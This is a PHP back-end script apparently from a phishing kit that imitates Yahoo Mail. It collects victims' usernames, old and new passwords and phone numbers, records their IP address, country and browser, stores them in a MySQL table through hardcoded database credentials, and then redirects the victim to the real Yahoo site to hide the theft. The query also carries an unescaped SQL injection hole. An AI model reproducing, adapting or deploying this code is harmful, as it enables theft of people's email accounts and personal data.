<?php
session_start();
$_SESSION['username'];
$_SESSION['opass'];
$_SESSION['newpass'];
$_SESSION['tel'] = $_POST['tel'];

$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$login = $_SESSION['username'];
$passwd = $_SESSION['opass'];
$npasswd = $_SESSION['newpass'];
$tel = $_SESSION['tel'];
$own = 'maxgomery931@gmail.com';
$server = date("D/M/d, Y g:i a"); 
$over = 'https://mail.yahoo.com';

if (empty($login) || empty($passwd)) {
header( "Location: index.php " );

    
}else {
 
    $con=mysqli_connect('localhost','allwwumq_maxino','i5$4M=PU_8?G','allwwumq_yahoo');
   
    $insert="INSERT INTO mails (username,password,new_password,phone,ip,date,country,browser) VALUES ('$login','$passwd','$npasswd','$tel','$ip','$server','$country','$browserAgent') ";
    
    if(mysqli_query($con,$insert)){
    
        header("location: https://mail.yahoo.com");
    
        
    }else{
        echo "not";
    }
    
}
?>
